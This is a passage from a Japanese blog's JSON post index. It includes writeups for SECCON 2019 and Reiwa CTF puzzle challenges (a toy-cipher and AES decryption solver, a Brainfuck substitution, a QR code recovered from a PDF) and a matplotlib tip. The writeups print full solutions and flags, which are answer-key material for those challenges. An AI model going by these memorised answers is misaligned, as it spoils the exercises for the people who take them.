xをyで割った余りmからxを求めるには，m*n(nは任意の数字)をしてxに該当するnを求めればよい．今回は最初の文字がSになるようなnを探して採用した． 3から「key1の {iをkey1の長さで割った余り}番目の文字をord()で数値に戻したものに0x20を引いたもの」を引く． 4に0x20を足す． 5をchr()して数値からASCIIに変換する．  これで元のtextに戻るはず．\n実装してみる．\n1 2 3 4 5 6 7 8 9 10  def decrypt(key,text): flag=\u0026#39;\u0026#39; for n in range(1,10000): if chr(((ord(text[0])-0x20)+(0x7e-0x20+1)*n)-(ord(key[0 % len(key)])-0x20)+0x20)==\u0026#39;S\u0026#39;: for i in range(len(text)): flag+=chr(((ord(text[i])-0x20)+(0x7e-0x20+1)*n)-(ord(key[i % len(key)])-0x20)+0x20) print(flag) return flag print(key1,rev3)   #ここで時間を取られた 個人的な話．ここで詰まった．(飛ばしてくれていいですよ)\n以上の出力結果はこうである．\nS¤¢¢®­{²uccess_£ecryption_¸eah_¸eah_S¤¢¢®­} 惜しい．非常に惜しい．エンコードミスだと思って一時間以上とられた．\n実際には前述のとおりnが一意でないので最初の文字だけでnを決めてはいけなかったのである．\nよく見てみるとASCIIコードの数値から微妙にずれている文字が文字化けしている．\n#なので 返り値に合わせて数値を調整する．\n1 2 3 4 5 6 7 8 9  flag=decrypt(key1,rev3) for index in range(len(flag)): if(ord(flag[index])\u0026gt;127): print(chr(ord(flag[index])-(0x7e-0x20+1)),end=\u0026#34;\u0026#34;) else: print(flag[index],end=\u0026#34;\u0026#34;) print()   やっと出た．\nSECCON{Success_Decryption_Yeah_Yeah_SECCON} solver全文\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  import sys from Crypto.Cipher import AES import base64 def encrypt(key, text): s = \u0026#39;\u0026#39; for i in range(len(text)): s += chr((((ord(text[i]) - 0x20) + (ord(key[i % len(key)]) - 0x20)) % (0x7e - 0x20 + 1)) + 0x20) return s def decrypt(key,text): flag=\u0026#39;\u0026#39; for n in range(1,10000): if chr(((ord(text[0])-0x20)+(0x7e-0x20+1)*n)-(ord(key[0 % len(key)])-0x20)+0x20)==\u0026#39;S\u0026#39;: for i in range(len(text)): flag+=chr(((ord(text[i])-0x20)+(0x7e-0x20+1)*n)-(ord(key[i % len(key)])-0x20)+0x20) return flag key1 = \u0026#34;SECCON\u0026#34; key2 = \u0026#34;seccon2019\u0026#34; out=\u0026#34;FyRyZNBO2MG6ncd3hEkC/yeYKUseI/CxYoZiIeV2fe/Jmtwx+WbWmU1gtMX9m905\u0026#34; cipher = AES.new(key2 + chr(0x00) * (16 - (len(key2) % 16)), AES.MODE_ECB) rev1=base64.b64decode(out.encode(\u0026#39;ascii\u0026#39;)) rev2=cipher.decrypt(rev1) rev3=rev2.decode(\u0026#39;ascii\u0026#39;).replace(\u0026#34;\\x05\u0026#34;,\u0026#34;\u0026#34;) flag=decrypt(key1,rev3) for index in range(len(flag)): if(ord(flag[index])\u0026gt;127): print(chr(ord(flag[index])-(0x7e-0x20+1)),end=\u0026#34;\u0026#34;) else: print(flag[index],end=\u0026#34;\u0026#34;) print()   Thank you for playing! サービス問題って前から二個だったっけ\u0026hellip;?\nSECCON{We have done all the challenges. Thank you!} おわりに 久しぶりにQiitaに記事書いた．\nWriteup書く気になるまでまぁまぁ時間がかかったが問題がまだ残っていてよかった．\n難読shellscriptは解けそうだったので復習しておきたい．\n実質一人で解いたがもう何問か解けそうだったので残念．（やっぱりWeb系が苦手）\n来週の高専のCTFに向けて復習していきたい．\n","description":"SECCON Online 2019 QualsのWriteup","id":22,"section":"posts","tags":["CTF","SECCON"],"title":"SECCON Online 2019 Quals Writeup","uri":"https://takana-norimasa.github.io/blog/posts/seccon_2019/"},{"content":" この記事は令和CTF writeup - Qiitaから移転してきたものです．\n 知らなくて普通に一時間遅刻しました．\nまぁ，早くいっても混んでたらしいですけど．\n時間内にwelcome問題含めて2問，終わってから1問解けました．\nバイナリにチャレンジして散りました．\nフラグの例は？ いわゆるサービス問題です．問題文からコピペ．\nSECCON{reiwa} これがあるのと無いのでは精神的にも違う気がする．\nbREInWAck 名前からしてbrainfckな気がします．\nbrainfckの命令を平成令和「」．に置き換えたものなんだろうなと予想．\n令和和和和和和和和和和和和和和和和「令和 和和和和令和和和和令和和和和和和和令和和 和和和和令和和平平平平平成」令和和和。令 和和和和和。成成。。平成成成成。成。令令 和和和和和和和和和和和。令和和。平平平和 和和和。令和和。和和和和。令令和和和和和 和和和和和和和。平平平和和和和和和和和和 和和和和。成成成成成成成成。令成成成成成 成成成。令令。成成成成成。成成成成成成。 令和。平平和和。令令令和和和和和和和和和 和。 wikipediaによるとbrainf*ckの命令は以下の八つだそうです．\n \u0026gt; ポインタをインクリメントする．ポインタをptrとすると，C言語の「ptr++;」に相当する．\n\u0026lt; ポインタをデクリメントする．C言語の「ptr\u0026ndash;;」に相当．\n  ポインタが指す値をインクリメントする．C言語の「(*ptr)++;」に相当．   ポインタが指す値をデクリメントする．C言語の「(*ptr)\u0026ndash;;」に相当．\n. ポインタが指す値を出力に書き出す．C言語の「putchar(*ptr);」に相当．\n, 入力から1バイト読み込んで，ポインタが指す先に代入する．C言語の「*ptr=getchar();」に相当．\n[ ポインタが指す値が0なら，対応する ] の直後にジャンプする．C言語の「while(*ptr){」に相当．\n] ポインタが指す値が0でないなら，対応する [ （の直後[1]）にジャンプする．C言語の「}」に相当[2]\nBrainfuck - Wikipedia  うーん．言いたいことは分かるけど\u0026hellip;\n命令が7つしか問題に出てこないのでパターンから置換して実行した方が早いなということで適当なサンプルを見つけてきます．\nわかりやすくbrainf*ckについて解説している記事があったのでそこのhello worldを参考にしました．\n  1 2  +++++++++[\u0026gt;++++++++\u0026gt;+++++++++++\u0026gt;+++\u0026gt;+\u0026lt;\u0026lt;\u0026lt;\u0026lt;-]\u0026gt;.\u0026gt;++.+++++++..+++.\u0026gt;+++++.\u0026lt;\u0026lt;+++++++++++++++.\u0026gt;.+++.------.--------.\u0026gt;+.\u0026gt;+.  Brainfuck 超入門 - Qiita\n+ばっかりじゃないか(驚愕)．これは和とかけているに違いない(確信)．\nもっと言えば，[]は「」に対応しているんじゃないかと．繰り返しの部分とぴったりです．\nどうやら，総当たりはいらなそうで一安心．\n「のあとに来ているので\u0026gt;は令ではないかと予測．\nこんな感じで，以下の対応表ができた．\n   before after     令 \u0026gt;   和 +   平 \u0026lt;   成 -   。 .   「 [   」 ]    置換したらこんな感じ．\n\u0026gt;++++++++++++++++[\u0026gt;+ ++++\u0026gt;++++\u0026gt;+++++++\u0026gt;++ ++++\u0026gt;++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;-]\u0026gt;+++.\u0026gt; +++++.--..\u0026lt;----.-.\u0026gt;\u0026gt; +++++++++++.\u0026gt;++.\u0026lt;\u0026lt;\u0026lt;+ +++.\u0026gt;++.++++.\u0026gt;\u0026gt;+++++ +++++++.\u0026lt;\u0026lt;\u0026lt;+++++++++ ++++.--------.\u0026gt;----- ---.\u0026gt;\u0026gt;.-----.------. \u0026gt;+.\u0026lt;\u0026lt;++.\u0026gt;\u0026gt;\u0026gt;+++++++++ +. あとは動かすだけ．\n以下のサイトが途中経過がみられて勉強になるのでおすすめ．\nBrainfuck Visualizer\nSECCON{bREIn_WAnic!} 素早くとけてスッキリ．\n新元号発表 みんな大好きQRコード．まぁ地道に解けばいけるだろ，と思っていましたが全然解けず翌日の夕方にやっと解けました．まさかこんなオチなんて\u0026hellip;盲点．\nnewera.pdfが渡されて，開くとこんな感じ．\nとりあえず，みんなの恋人foremostをつかって調べてみる．\n# foremost newera.pdf File: newera.pdf Start: Wed May 1 00:18:51 2019 Length: 77 KB (79665 bytes) Num\tName (bs=512)\tSize\tFile Offset\tComment 0:\t00000019.jpg 41 KB 9827 1:\t00000102.jpg 12 KB 52646 2:\t00000000.pdf 77 KB 0 Finish: Wed May 1 00:18:51 2019 やっぱり，前の画像とQRのある後ろの画像は別々．\n出てきた画像からとったQRがこれ．\nQR問題の味方，https://github.com/waidotto/strong-qr-decoder/でとりあえずやってみることにする．\nまたあの地味な手打ちをするのか\u0026hellip;と観念しながら頑張ってみるも出ない．\nかなり頑張ったが出ない．それでも粘るが出ない．\n画像と重ねたりして確かめてみても出ない．\n観念してlibreoffceをインストールして見てみると，意外と楽に画像が動かせる．あれ？\n出たわね．これまでの頑張りを返して(切実)\nGIMPで黒い部分を抽出して合成して，\n合成が下手なのでツールで手打ちして読み込んで完成．\nThe flag is SECCON{overlay_overlap_overera} 反省 バイナリに手が出なかったので反省．\n何か毎回バイナリでつまるので特訓したい的なことをいってる気がする．\nweb系もサーバ系もダメなのでこれから頑張る．\n参考 Brainfuck 超入門 - Qiita\nBrainfuck Visualizer\nGitHub - waidotto/strong-qr-decoder: 強力なQRコードデコーダ\n","description":"令和CTFのwriteup","id":23,"section":"posts","tags":["CTF","SECCON"],"title":"令和CTF writeup","uri":"https://takana-norimasa.github.io/blog/posts/reiwactf/"},{"content":" この記事はmatplotlibで特定のデータをプロットしない方法 - Qiitaから移転してきたものです．\n はじめに 漫画の掲載順を取得してグラフ化する記事を書いている時に休載で掲載順を取得できない月があり，グラフ化するときに困った．\nmatplotlibで特定のデータをプロットしない方法が後から分かったのでメモ．\n環境 # uname -a Linux kali 4.18.0-kali2-amd64 #1 SMP Debian 4.18.10-2kali1 (2018-10-09) x86_64 GNU/Linux # python --version Python 3.7.2+ # pip3 show matplotlib Name: matplotlib Version: 2.2.2 問題 例えば，以下のようなデータがあったとする．\n   month 1月 2月 3月 4月 5月 6月 7月 8月 9月 10月 11月 12月      data 13 15 21 5 10  21 17 15 16 21 13     6月だけデータがない．\n1  Y_data=[13,15,21,5,10, ,21,17,15,16,21,13]   Y軸のデータの配列に空きができてしまった．どうすればいいのか．\n解決法 プロットしたくないor欠損しているデータにはNoneを代入するとその項目はプロットされなくなる．\n1  Y_data=[13,15,21,5,10,None,21,17,15,16,21,13]   こんな感じ．\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  #!/usr/bin/env python  import matplotlib.pyplot as plt X_data=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12] Y_data=[13,15,21,5,10,None,21,17,15,16,21,13] month_name=[\u0026#39;Jan.\u0026#39;,\u0026#39;Feb.\u0026#39;,\u0026#39;Mar.\u0026#39;,\u0026#39;Apr.\u0026#39;,\u0026#39;May\u0026#39;,\u0026#39;Jun.\u0026#39;,\u0026#39;Jul.\u0026#39;,\u0026#39;Aug.\u0026#39;,\u0026#39;Sep.\u0026#39;,\u0026#39;Oct.\u0026#39;,\u0026#39;Nov.\u0026#39;,\u0026#39;Dec.\u0026#39;] plt.xlabel(\u0026#39;month\u0026#39;) plt.ylabel(\u0026#39;data\u0026#39;) plt.xticks(X_data,month_name) plt.plot(X_data,Y_data) plt.show()    結果\n 一件落着．\n参考文献 python - matplotlibにおけるグラフの始点の指定 - スタック・オーバーフロー\nこれのお陰で助かりました．ありがとうございます．\n","description":"matplotlibで特定の項目にだけマーカーをつける方法","id":25,"section":"posts","tags":["Python","matplotlib"],"title":"matplotlibで特定のデータをプロットしない方法","uri":"https://takana-norimasa.github.io/blog/posts/mplib_plot/"}]